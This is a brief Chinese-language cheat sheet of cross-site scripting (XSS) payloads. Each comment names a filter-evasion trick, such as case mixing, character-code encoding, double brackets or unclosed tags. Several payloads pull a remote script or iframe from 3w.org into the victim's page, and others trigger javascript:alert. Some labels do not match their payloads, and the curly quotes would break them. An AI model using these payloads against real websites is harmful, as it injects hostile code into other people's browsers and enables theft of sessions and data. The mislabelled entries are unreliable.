### xss攻击
```shell
#普通的XSS JavaScript注入
<SCRIPT SRC=http://3w.org/XSS/xss.js></SCRIPT>
#IMG标签XSS使用JavaScript命令
<SCRIPT SRC=http://3w.org/XSS/xss.js></SCRIPT>
#IMG标签无分号无引号
<IMG SRC=javascript:alert(‘XSS’)>
#IMG标签大小写不敏感
<IMG SRC=JaVaScRiPt:alert(‘XSS’)>
#HTML编码(必须有分号)
<IMG SRC=javascript:alert(“XSS”)>
#修正缺陷IMG标签
# <IMG “”"><SCRIPT>alert(“XSS”)</SCRIPT>”>
#formCharCode标签(计算器)
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
#双开括号
# <<SCRIPT>alert(“XSS”);//<</SCRIPT>
# 无结束脚本标记(仅火狐等浏览器)
# <SCRIPT SRC=http://3w.org/XSS/xss.js?<B>
# 双开角括号
# <iframe src=http://3w.org/XSS.html <
```
